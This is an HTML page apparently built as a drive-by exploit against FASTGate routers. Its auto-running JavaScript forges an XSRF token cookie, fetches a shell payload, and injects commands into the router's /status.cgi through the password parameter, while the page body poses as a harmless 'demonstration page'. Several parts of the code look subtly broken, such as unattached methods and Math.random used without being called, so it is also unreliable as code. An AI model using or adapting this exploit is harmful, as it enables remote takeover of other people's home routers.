<html>
<head>
<title>FASTGate targeted remote exploitation service</title>
<script>
var ajax, exploit, isthisyou, mp, random_string, token;
ajax = function(url, params, hdrs) {
  var qs, req;
  try {
    req = new XMLHttpRequest;
    qs = new URLSearchParams;
    if (params) {
      for (const [key, val] of Object.entries(params)) {
        qs.append(key, val);
      }
      url += "?" + (qs.toString());
    }
    req.open('GET', url, 0);
    req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    if (hdrs) {
      for (const [key, val] of Object.entries(hdrs)) {
        req.setRequestHeader(key, val);
      }
    }
    req.send();
    if (req.status === 200) {
      return req.responseText;
    } else {
      return null;
    }
  } catch (error) {
    return null;
  }
};
random_string = function(len) {
  var ascii_letters, digits, i, j, letters, ref, result;
  ascii_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  digits = '0123456789';
  letters = ascii_letters + digits;
  result = '';
  for (i = j = 0, ref = len; 0 <= ref ? j < ref : j > ref; i = 0 <= ref ? ++j : --j) {
    result += letters.charAt(Math.random() * letters.length);
  }
  return result;
};
exploit = function(cmd, token) {
  var hdrs, params;
  params = {
    '_': (Math.round((new Date).getTime() / 1000)) + "pytester" + (random_string(12)),
    'sessionKey': 'NULL',
    'cmd': '3',
    'nvget': 'login_confirm',
    'username': random_string(4),
    'password': "'; " + cmd + " ; #"
  };
  hdrs = {
    'X-XSRF-TOKEN': token,
    'DNT': '1',
    'Cookie': document.cookie
  };
  return ajax('/status.cgi', params, hdrs);
};
isthisyou = function() {
  return ajax('/status.cgi', {
    '_': (Math.round(Date.getTime / 1000)) + "pytester" + (random_string(12))
  });
};
this.Payload = (function() {
  var get, hasnot, set;
  function Payload() {}
  set = function() {
    if (!isthisyou()) {
      this.code = ajax('/payload.shell');
    }
  };
  hasnot = function() {
    return this.code == null;
  };
  get = function() {
    return this.code;
  };
  return Payload;
})();
mp = new Payload;
while (mp.hasnot()) {
  mp.set();
}
token = Math.round(Math.random * 100000000000);
document.cookie = "XSRF-TOKEN=" + token;
while (true) {
  if (isthisyou()) {
    exploit(mp.get(), token);
    break;
  }
}
</script>
</head>
<body>
<p>Hello visitor, this is a demonstration page.</p>
</body>
</html>
